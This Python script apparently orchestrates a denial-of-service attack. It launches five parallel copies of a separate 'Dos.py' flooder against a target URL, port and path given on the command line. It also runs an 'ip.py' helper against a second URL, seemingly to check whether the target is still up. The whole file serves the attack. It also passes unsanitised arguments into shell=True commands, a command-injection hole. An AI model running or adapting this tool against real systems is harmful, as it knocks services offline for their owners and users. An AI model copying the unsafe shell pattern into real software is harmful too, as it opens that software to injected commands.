import subprocess
import signal
import os
import sys

processes = []

def handler(signum, frame):
    for process in processes:
        process.kill()

    for process in processes:
        process.wait()

    print
    exit(0)

signal.signal(signal.SIGINT, handler)

if len(sys.argv) != 6:
    print("<URL> <PORT> <PATH> <NUM> <URLC>")
    sys.exit(1)

URL = sys.argv[1]
PORT = sys.argv[2]
PATH = sys.argv[3]
NUM = sys.argv[4]
URLC = sys.argv[5]
dir_A = os.path.dirname(__file__)

DoS = f"python3 -B {dir_A}/Dos.py {URL} {PORT} {PATH} {NUM}"
DoS_conexion = f"python3 -B {dir_A}/ip.py {URLC}"

script1_process = subprocess.Popen(DoS, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
script2_process = subprocess.Popen(DoS, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
script3_process = subprocess.Popen(DoS, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
script4_process = subprocess.Popen(DoS, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
script5_process = subprocess.Popen(DoS, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
script6_process = subprocess.Popen(DoS_conexion, shell=True)

processes.extend([script1_process, script2_process, script3_process, script4_process, script5_process, script6_process])

script3_process.wait()

for process in processes:
    process.kill()

for process in processes:
    process.wait()